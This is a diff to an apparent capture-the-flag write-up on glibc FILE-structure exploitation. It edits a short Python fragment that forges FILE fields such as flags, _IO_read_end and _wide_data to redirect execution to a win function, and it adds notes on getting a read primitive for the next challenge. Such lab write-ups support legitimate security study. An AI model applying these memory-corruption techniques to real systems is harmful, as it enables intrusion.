@@ -421,14 +421,17 @@ I've adjusted abit the exploit, and set the string within the `flags` argument.
 ```python
 fp.flags = 0x64726f7773736170
 fp._IO_read_ptr = 0
-fp._IO_read_end = stream_addr - 0xe0 - 0x68 + 224 + 24  # fake vtable
+fp._IO_read_end = stream_addr - 0xe0 - 0x68 + 224 + 24
 fp._IO_read_base = win_addr
+fp._wide_data = stream_addr - 0xe0 + 16
 ```
 
 Rest of the exploit remained the same. 
 
 ## Challenge 11
 
+Now things gets interesting. There's a menu that allows us to do many operations. \ 
+In this challenge, we only need to obtain read primitive to leak the flag. This can be easily done by setting appropriate values for `write_base, write_ptr, read_end`. 
 
 
 
